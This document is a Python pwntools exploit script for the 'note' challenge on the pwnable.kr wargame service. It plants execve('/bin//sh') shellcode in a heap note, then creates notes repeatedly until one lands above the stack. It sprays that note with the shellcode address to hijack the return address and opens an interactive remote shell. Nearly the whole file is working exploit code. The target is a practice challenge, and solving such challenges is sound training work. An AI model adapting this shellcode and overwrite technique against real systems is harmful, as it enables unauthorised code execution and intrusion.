from pwn import *

default_stack = 0xffffd830
max_addr = 0
max_no = '0'
shellcode_addr = 0
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0], execute='b *0x080489f0')

def exit_note():
    p.sendline('5')
    #launch_gdb()
    #p.send('\n')
    p.interactive()

def write_note(no, value):
    print p.recvuntil('5. exit\n')
    p.sendline('2')
    print p.recvuntil('note no?')
    p.sendline(no)
    print p.recvuntil('4096 byte)')
    p.sendline(value)

def delete_note(no):
    print p.recvuntil('5. exit\n')
    p.sendline('4')
    print p.recvuntil('note no?')
    p.sendline(no)

def create_note():
    global default_stack
    global shellcode_addr
    global shellcode
    global max_addr
    global max_no

    print p.recvuntil('5. exit\n')
    p.sendline('1')
    print p.recvuntil('note created. no ')
    no = p.recvline().strip()
    print ("no",no)
    print p.recvuntil('[')
    default_stack -= 1072
    rand_addr = int(p.recv(8), 16)

    if rand_addr>max_addr:
        max_addr = rand_addr
        max_no = no

        if shellcode_addr == 0:
            shellcode_addr = rand_addr
            write_note(no, shellcode)
    else:
        delete_note(no)

    print ("stack:" + hex(default_stack), "rand_mem:" + hex(rand_addr), \
           "max_addr:" + hex(max_addr))
    if max_addr > default_stack:
        print ("FIND IT!!!!!!!!!!!!!")
        print ("shellcode_addr:"+hex(shellcode_addr))
        write_note(max_no, p32(shellcode_addr) * 1023)
        exit_note()


p = remote('pwnable.kr', 9019)
while (1):
    create_note()